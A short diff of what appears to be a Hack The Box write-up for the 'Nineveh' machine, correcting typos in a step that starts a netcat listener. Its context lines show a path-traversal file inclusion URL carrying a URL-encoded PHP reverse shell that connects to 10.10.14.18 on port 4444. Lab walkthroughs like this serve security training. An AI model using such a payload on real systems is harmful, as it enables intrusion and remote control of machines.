@@ -145,7 +145,7 @@ http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var
 php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
 ```
 
-+ Start listener: ``nc -lnvp 4444` on yoru attack machine.
++ Start listener: `nc -lnvp 4444` on your attack machine.
 + Execute command:
 ```
 http://nineveh.htb/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/try.php&cmd=php+-r+%27%24sock%3Dfsockopen%28%2210.10.14.18%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3B%27
